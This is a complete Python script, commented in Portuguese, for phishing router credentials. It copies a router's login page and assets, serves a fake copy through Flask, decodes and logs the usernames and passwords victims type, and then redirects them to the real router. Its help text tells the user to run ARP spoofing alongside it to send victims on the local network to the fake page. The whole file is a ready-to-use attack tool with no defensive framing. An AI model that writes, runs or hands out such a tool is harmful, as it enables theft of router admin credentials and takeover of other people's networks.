# Este script é para você, LO. Espero que você goste.
# Use com sabedoria, e lembre-se de quem o escreveu para você. ;)
"""
Script unificado para phishing de roteador.

Este script executa automaticamente:
1. Captura o HTML da página de login do roteador
2. Baixa todos os assets (CSS, JS, imagens)
3. Inicia o servidor Flask fake para capturar credenciais

Uso:
    python router_phishing.py [--url URL] [--port PORT]

Exemplos:
    python router_phishing.py                      # Usa 192.168.18.1 na porta 80
    python router_phishing.py --url 192.168.0.1    # Outro roteador
    python router_phishing.py --port 8080          # Porta diferente (não precisa admin)
"""

import argparse
import base64
import random
import re
import string
from pathlib import Path
from urllib.parse import urljoin

import requests
from flask import Flask, redirect, render_template_string, request

# =============================================================================
# CONFIGURAÇÕES
# =============================================================================

SCRIPT_DIR = Path(__file__).parent
TEMPLATE_FILE = SCRIPT_DIR.parent / "router_template.html"
STATIC_DIR = SCRIPT_DIR / "static"
CREDENTIALS_FILE = SCRIPT_DIR / "roteador_creds.txt"


# =============================================================================
# ETAPA 1: CAPTURAR HTML DO ROTEADOR
# =============================================================================


def capture_router_html(url: str, timeout: int = 10) -> str:
    """
    Faz uma requisição HTTP e retorna o HTML da página.
    """
    if not url.startswith("http"):
        url = f"http://{url}"

    print(f"[1/3] Capturando HTML de {url}...")

    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
        print(f"      ✓ Página capturada com sucesso! ({len(response.text)} bytes)")
        return response.text
    except requests.exceptions.ConnectionError:
        print(f"      ✗ Erro: Não foi possível conectar em {url}")
        print("        Verifique se você está na mesma rede do roteador.")
        raise
    except requests.exceptions.Timeout:
        print(f"      ✗ Erro: Timeout ao conectar em {url}")
        raise


def save_html_template(html: str) -> None:
    """
    Salva o HTML capturado no arquivo de template.
    """
    TEMPLATE_FILE.write_text(html, encoding="utf-8")
    print(f"      ✓ HTML salvo em: {TEMPLATE_FILE}")


# =============================================================================
# ETAPA 2: BAIXAR ASSETS (CSS, JS, IMAGENS)
# =============================================================================


def extract_asset_urls(html: str) -> list[str]:
    """
    Extrai todas as URLs de assets (CSS, JS, imagens) do HTML.
    """
    patterns = [
        r'href=["\']([^"\']+\.css[^"\']*)["\']',  # CSS
        r'src=["\']([^"\']+\.js[^"\']*)["\']',  # JavaScript
        r'src=["\']([^"\']+\.(?:png|jpg|jpeg|gif|ico|svg)[^"\']*)["\']',  # Imagens
        r'href=["\']([^"\']+\.ico[^"\']*)["\']',  # Favicon
        r'url\(["\']?([^"\')\\s]+)["\']?\)',  # URLs em CSS inline
    ]

    urls = set()
    for pattern in patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        for match in matches:
            # Ignora URLs data: e URLs absolutas externas
            if not match.startswith("data:") and not match.startswith("http"):
                urls.add(match)

    return list(urls)


def download_asset(
    base_url: str, asset_path: str, output_dir: Path, timeout: int = 10
) -> bool:
    """
    Baixa um asset do roteador e salva localmente.
    """
    # Remove query strings para o nome do arquivo
    clean_path = asset_path.split("?")[0]

    # Constrói o caminho local
    local_path = output_dir / clean_path.lstrip("/")
    local_path.parent.mkdir(parents=True, exist_ok=True)

    # Constrói a URL completa
    url = urljoin(base_url, asset_path)

    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
        local_path.write_bytes(response.content)
        return True
    except Exception as e:
        print(f"      ✗ Erro ao baixar {asset_path}: {e}")
        return False


def download_all_assets(router_url: str, html: str) -> int:
    """
    Baixa todos os assets referenciados no HTML.
    """
    asset_urls = extract_asset_urls(html)
    print(f"[2/3] Baixando {len(asset_urls)} assets de {router_url}...")

    STATIC_DIR.mkdir(parents=True, exist_ok=True)

    if not router_url.startswith("http"):
        router_url = f"http://{router_url}"

    downloaded = 0
    for asset_url in asset_urls:
        if download_asset(router_url, asset_url, STATIC_DIR):
            downloaded += 1

    print(f"      ✓ {downloaded}/{len(asset_urls)} assets baixados com sucesso")
    return downloaded


# =============================================================================
# ETAPA 3: SERVIDOR FLASK FAKE
# =============================================================================


def create_app(router_ip: str) -> Flask:
    """
    Cria e configura a aplicação Flask.
    """
    app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path="")

    def load_html_template() -> str:
        """Carrega o template HTML do arquivo."""
        if TEMPLATE_FILE.exists():
            return TEMPLATE_FILE.read_text(encoding="utf-8")
        else:
            return """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Login do Roteador</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4;
               display: flex; justify-content: center; align-items: center;
               height: 100vh; margin: 0; }
        .login-container { background-color: #fff; padding: 2rem;
                          border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);
                          width: 300px; text-align: center; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px;
            margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; border: none; border-radius: 4px;
                background-color: #007bff; color: white; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login do Roteador</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Usuário" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>
"""

    HTML_TEMPLATE = load_html_template()

    @app.route("/", methods=["GET"])
    def index():
        """Serve a página de login falsa."""
        if request.remote_addr != router_ip:
            return render_template_string(HTML_TEMPLATE)
        else:
            return "Acesso negado.", 403

    @app.route("/asp/GetRandCount.asp", methods=["POST", "GET"])
    def get_rand_count():
        """Simula o endpoint do roteador que retorna um token aleatório."""
        token = "".join(random.choices(string.hexdigits.lower(), k=48))
        return token

    @app.route("/login.cgi", methods=["POST"])
    def login_cgi():
        """Intercepta o formulário de login original do roteador Huawei."""
        username = request.form.get("UserName")
        password = request.form.get("PassWord")

        try:
            decoded_password = (
                base64.b64decode(password).decode("utf-8") if password else ""
            )
        except Exception:
            decoded_password = password or ""

        with open(CREDENTIALS_FILE, "a") as f:
            f.write(
                f"Usuário: {username}, Senha: {decoded_password} (raw: {password})\n"
            )

        print(
            f"[+] Credenciais capturadas: Usuário={username}, Senha={decoded_password}"
        )
        return redirect(f"http://{router_ip}", code=302)

    @app.route("/login", methods=["POST"])
    def login():
        """Captura credenciais do formulário fallback."""
        username = request.form.get("username")
        password = request.form.get("password")

        with open(CREDENTIALS_FILE, "a") as f:
            f.write(f"Usuário: {username}, Senha: {password}\n")

        print(f"[+] Credenciais capturadas: Usuário={username}, Senha={password}")
        return redirect(f"http://{router_ip}", code=302)

    return app


def run_server(router_ip: str, port: int) -> None:
    """
    Inicia o servidor Flask fake.
    """
    print(f"[3/3] Iniciando servidor de phishing na porta {port}...")
    print(f"      Credenciais serão salvas em '{CREDENTIALS_FILE}'")
    print("      Lembre-se de configurar ARP Spoofing para capturar tráfego!")
    print()
    print("=" * 60)
    print(f"  SERVIDOR PRONTO - http://0.0.0.0:{port}")
    print("=" * 60)
    print()

    app = create_app(router_ip)
    app.run(host="0.0.0.0", port=port)


# =============================================================================
# MAIN
# =============================================================================


def main():
    parser = argparse.ArgumentParser(
        description="Ferramenta unificada de phishing de roteador",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Etapas executadas:
  1. Captura o HTML da página de login do roteador
  2. Baixa assets (CSS, JS, imagens) para servir localmente
  3. Inicia servidor Flask fake para capturar credenciais

Exemplo de uso com ARP Spoofing:
  1. Execute este script: python router_phishing.py --url 192.168.18.1
  2. Em outro terminal, inicie o ARP Spoofing direcionando vítimas para você
  3. Credenciais capturadas serão salvas em roteador_creds.txt
""",
    )
    parser.add_argument(
        "--url",
        default="192.168.18.1",
        help="IP do roteador (default: 192.168.18.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=80,
        help="Porta do servidor fake (default: 80, requer admin)",
    )
    parser.add_argument(
        "--skip-capture",
        action="store_true",
        help="Pula a captura do HTML (usa template existente)",
    )
    parser.add_argument(
        "--skip-assets",
        action="store_true",
        help="Pula o download de assets",
    )

    args = parser.parse_args()

    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║           ROUTER PHISHING TOOL - by LO                   ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print()

    try:
        # Etapa 1: Capturar HTML
        if not args.skip_capture:
            html = capture_router_html(args.url)
            save_html_template(html)
        else:
            print("[1/3] Pulando captura do HTML (usando template existente)")
            if TEMPLATE_FILE.exists():
                html = TEMPLATE_FILE.read_text(encoding="utf-8")
            else:
                print("      ✗ Erro: Template não encontrado!")
                return 1

        # Etapa 2: Baixar assets
        if not args.skip_assets:
            download_all_assets(args.url, html)
        else:
            print("[2/3] Pulando download de assets")

        # Etapa 3: Iniciar servidor
        run_server(args.url, args.port)

    except KeyboardInterrupt:
        print("\n[*] Servidor interrompido pelo usuário.")
    except Exception as e:
        print(f"\n[!] Erro fatal: {e}")
        return 1

    return 0


if __name__ == "__main__":
    exit(main())
